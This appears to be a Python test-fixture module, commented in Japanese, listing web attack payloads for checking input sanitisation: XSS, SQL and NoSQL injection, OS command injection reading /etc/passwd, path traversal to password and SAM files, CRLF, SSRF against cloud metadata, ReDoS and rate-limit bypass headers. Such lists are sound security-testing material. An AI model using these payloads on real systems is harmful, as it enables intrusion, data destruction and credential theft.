"""
セキュリティテスト用攻撃ペイロード集

各カテゴリごとに攻撃パターンを定義。
テスト対象のWebアプリケーションが適切に入力をサニタイズしているか検証するために使用。
"""

# =============================================================================
# XSS (Cross-Site Scripting)
# =============================================================================

XSS_PAYLOADS: list[str] = [
    # 基本的なスクリプトタグ
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    
    # imgタグ系
    "<img src=x onerror=alert(1)>",
    
    # プロトコルハンドラ
    "javascript:alert(1)",

    # エンコード系
    "%3Cscript%3Ealert(1)%3C/script%3E",  # URLエンコード
    "&#60;script&#62;alert(1)&#60;/script&#62;",  # HTMLエンティティ
    
    # イベントハンドラ系
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    
    # 属性インジェクション
    "\" onclick=\"alert(1)\"",
    "' onclick='alert(1)'",
    
    # DOM-based XSS誘発パターン
    "<a href=\"javascript:alert(1)\">click</a>",
    "<iframe src=\"javascript:alert(1)\">",
]

# =============================================================================
# SQL Injection
# =============================================================================

SQL_INJECTION_PAYLOADS: list[str] = [
    # 基本的なSQLi
    "' OR '1'='1",
    "admin' --",
    "UNION SELECT 1, version() --",
    "'; DROP TABLE users; --",
    
    # ブラインドSQLi（タイムベース）
    "' AND SLEEP(5)--",
    "' AND 1=1--",
    "' AND 1=2--",
    
    # 各DBMS向け
    "'; WAITFOR DELAY '0:0:5'--",  # MSSQL
    "' || pg_sleep(5)--",  # PostgreSQL
    
    # フィルタバイパス
    "'/**/OR/**/1=1--",
    "' oR '1'='1",  # 大文字小文字混合
    
    # 数値型カラム向け
    "1 OR 1=1",
    "1; DROP TABLE users",
]

# タイムベースSQLi専用（遅延検出用）
SQL_TIME_BASED_PAYLOADS: list[str] = [
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "' || pg_sleep(5)--",
]

# =============================================================================
# OS Command Injection
# =============================================================================

OS_CMD_PAYLOADS: list[str] = [
    "; cat /etc/passwd",
    "| ls -la",
    "& ping -c 10 127.0.0.1",
    "`echo VULN_INJECTABLE`",
    "$(whoami)",
    "$(echo VULN_INJECTABLE)",
    "; id",
]

# =============================================================================
# Path Traversal
# =============================================================================

PATH_TRAVERSAL_PAYLOADS: list[str] = [
    # 基本的なトラバーサル
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    
    # URLエンコード
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    
    # 二重エンコード
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # Windows向け
    "..\\..\\..\\windows\\system32\\config\\sam",
    
    # NULLバイトトランケーション
    "../../../etc/passwd%00.jpg",
]

# =============================================================================
# CRLF / HTTP Header Injection
# =============================================================================

CRLF_PAYLOADS: list[str] = [
    # 基本的なCRLF
    "test\r\nSet-Cookie: malicious=true",
    "test\r\n\r\n<html>injected</html>",
    
    # URLエンコード版
    "test%0d%0aSet-Cookie:%20evil=1",
    "test%0D%0ASet-Cookie:%20hacked=true",
    
    # 改行のみ
    "test%0aSet-Cookie:%20lf=1",
    "test%0dSet-Cookie:%20cr=1",
    
    # ダブルCRLF（ボディインジェクション）
    "test%0d%0a%0d%0a<script>alert(1)</script>",
    
    # ヘッダ終端攻撃
    "test\r\nX-Injected: header",
    "test\r\nContent-Length: 0\r\n\r\nmalicious",
    
    # Unicode変種
    "test\u000d\u000aSet-Cookie: unicode=1",
    
    # 二重URLエンコード
    "test%250d%250aSet-Cookie:%20double=1",
    
    # HTMLエンティティ
    "test&#13;&#10;Set-Cookie: entity=1",
]

# =============================================================================
# SSRF (Server-Side Request Forgery)
# =============================================================================

# 注意: これらのペイロードは隔離されたテスト環境でのみ使用すること
# 本番環境での実行は禁止
SSRF_PAYLOADS: list[str] = [
    # ローカルホスト
    "http://localhost:22",
    "http://127.0.0.1:3306",
    "http://[::1]:80",
    
    # クラウドメタデータ（テスト環境でのみ使用）
    "http://169.254.169.254/",  # AWS/GCP metadata
    "http://169.254.169.254/latest/meta-data/",
    
    # 内部ネットワーク
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    
    # DNS rebinding対策確認
    "http://localtest.me/",
]

# =============================================================================
# NoSQL Injection (MongoDB等)
# =============================================================================

NOSQL_PAYLOADS: list[str] = [
    # 比較演算子インジェクション
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    
    # 配列インジェクション
    '{"$in": ["admin", "root"]}',
    
    # JavaScript実行
    '{"$where": "this.password.length > 0"}',
    
    # 文字列形式
    "admin'});return true;db.users.find({'a':'",
]

# =============================================================================
# Boundary / Stress Test
# =============================================================================

# 長大入力のサイズ定数
LONG_INPUT_SIZE: int = 100_000  # 10万文字
MULTIBYTE_REPEAT_COUNT: int = 1000  # マルチバイト文字の繰り返し回数

BOUNDARY_PAYLOADS: list[str] = [
    "A" * LONG_INPUT_SIZE,  # バッファオーバーフロー検証
    "\x00" * 100,  # NULLバイト
    "日本語" * MULTIBYTE_REPEAT_COUNT,  # マルチバイト文字
    "🎉🔥💀" * MULTIBYTE_REPEAT_COUNT,  # 絵文字
]

# NULLバイトインジェクション
NULL_BYTE_PAYLOADS: list[str] = [
    "test\x00admin",
    "file.txt\x00.jpg",
    "\x00\x00\x00",
]

# Unicode正規化攻撃
UNICODE_NORMALIZATION_PAYLOADS: list[str] = [
    "＜script＞alert(1)＜/script＞",  # 全角
    "\uff1cscript\uff1e",  # Unicode
    "ſcript",  # 特殊文字 (long s)
]

# マルチバイト文字テスト
MULTIBYTE_PAYLOADS: list[str] = [
    "日本語テスト" * 100,
    "🎉🔥💀" * 100,
    "тест" * 100,  # キリル文字
    "العربية" * 100,  # アラビア語
]

# =============================================================================
# ReDoS (Regular Expression Denial of Service)
# =============================================================================

# 脆弱な正規表現パターンを悪用するペイロード
# 例: (a+)+ に対して "aaaa...!" を入力すると指数的に時間がかかる
REDOS_PAYLOADS: list[str] = [
    # (a+)+ パターン攻撃
    "a" * 30 + "!",
    "a" * 50 + "!",
    
    # (a|a)+ パターン攻撃
    "a" * 30 + "b",
    
    # (a+)* パターン攻撃
    "a" * 30 + "X",
    
    # ネストした繰り返し
    "a" * 25 + "@" + "a" * 25,
    
    # メールバリデーション攻撃（一般的な脆弱パターン）
    "a" * 50 + "@" + "a" * 50 + ".com!",
    
    # URLバリデーション攻撃
    "http://" + "a" * 50 + "." + "a" * 50 + "!",
    
    # 複合パターン
    ("a" * 10 + "b") * 5 + "!",
]

# =============================================================================
# Rate Limit Bypass
# =============================================================================

# X-Forwarded-For 偽装によるバイパス試行
RATE_LIMIT_BYPASS_HEADERS: list[dict[str, str]] = [
    # 偽装IPアドレス
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.100"},
    {"X-Forwarded-For": "8.8.8.8"},
    
    # 複数IP（プロキシチェーン偽装）
    {"X-Forwarded-For": "203.0.113.50, 70.41.3.18, 150.172.238.178"},
    
    # その他のプロキシ関連ヘッダー
    {"X-Real-IP": "10.0.0.1"},
    {"X-Client-IP": "10.0.0.1"},
    {"X-Originating-IP": "10.0.0.1"},
    {"CF-Connecting-IP": "10.0.0.1"},  # Cloudflare
    {"True-Client-IP": "10.0.0.1"},  # Akamai
    {"X-Cluster-Client-IP": "10.0.0.1"},
    
    # 複合パターン
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "10.0.0.1"},
]

# User-Agent ローテーション（フィンガープリント回避）
RATE_LIMIT_BYPASS_USER_AGENTS: list[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "curl/7.68.0",
    "python-requests/2.28.0",
]